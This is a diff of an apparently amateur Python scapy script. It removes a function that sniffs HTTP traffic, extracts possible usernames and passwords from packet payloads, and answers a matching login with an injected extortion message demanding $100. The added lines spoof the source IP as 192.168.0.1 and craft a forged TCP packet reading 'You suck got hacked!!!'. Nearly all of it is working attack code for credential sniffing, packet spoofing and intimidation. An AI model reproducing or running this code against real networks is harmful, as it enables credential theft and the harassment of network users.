@@ -24,53 +24,6 @@ def get_login_info(packet):
             if keyword.encode() in load:
                 return load
 
-
-def process_sniffed_packet(packet):
-    # print("sucess")
-    # print(packet.src)
-    if packet.haslayer(http.HTTPRequest):
-        url = get_url(packet)
-        print("[+] HTTP Request >> " + url.decode("utf-8"))
-
-        login_info = get_login_info(packet)
-        if login_info:
-            # print("hihi")
-            print("\n\n[+] Possible username/password > "
-                  + login_info.decode()
-                  + "\n\n")
-            if (login_info.decode() == "uname=" + "000" + "&" + "pass=" + "123"):
-                packet.show()
-                
-                #print("You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever")
-                print("in")
-               # packet.getlayer(1).hwsrc='5'
-                
-                nPayload="You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever"
-                xPayload = nPayload.encode('utf-8')
-                nPayload =""
-                packet.getlayer(scapy.packet.Raw).load=xPayload
-                # print(packet.getlayer(layers.l2.Ethernet).src)
-                print(packet.getlayer(scapy.packet.Raw).load)
-
-                buffIpdst = packet.getlayer(scapy.IP).dst
-                buffIpsrc = packet.getlayer(scapy.IP).src
-                buffEthdst = packet.getlayer(layers.l2.Ether).dst
-                buffEthsrc = packet.getlayer(layers.l2.Ether).src
-
-                packet.getlayer(scapy.IP).dst = buffIpsrc.encode('utf-8')
-                packet.getlayer(scapy.IP).src = buffIpdst.encode('utf-8')
-                packet.getlayer(layers.l2.Ether).dst = buffEthsrc.encode('utf-8')
-                packet.getlayer(layers.l2.Ether).src = buffEthdst.encode('utf-8')
-                packet.show()   
-
-        
-                scapy.send(packet)
-                packet.show()
-                #print(arp_request_broadcast.payload.layers())
-                #rawPayload = (arp_request_broadcast.getlayer(scapy.IP).version)
-                #rawPayload = arp_request_broadcast.layers()
-                #arp_request_broadcast.getlayer(scapy.packet.Raw).load="stfu3"
-                #rawPayload = (arp_request_broadcast.getlayer(scapy.packet.Raw).load)
                 #print(rawPayload)
 
 def n_process(packet):
@@ -91,9 +44,12 @@ def n_process(packet):
                 buffIpsrc = packet.getlayer(scapy.IP).src
                 buffEthdst = packet.getlayer(layers.l2.Ether).dst
                 buffEthsrc = packet.getlayer(layers.l2.Ether).src
-
+                print("IP src: " + buffIpsrc)
+                print("IP dst: " + buffIpdst)
+                print("MAC src eth: " + buffEthsrc)
+                print("MAC dst eth: " + buffEthdst)
                 nEth = scapy.Ether(buffEthsrc) 
-                nIp = scapy.IP(src =buffIpdst ,dst=buffIpsrc,ttl=10)
+                nIp = scapy.IP(src ="192.168.0.1" ,dst=buffIpsrc,ttl=10)
                 nTcp=scapy.TCP(sport=8888,dport=88)
                 nPayload="You suck got hacked!!!"
                 nPkt=nEth/nIp/nTcp/nPayload
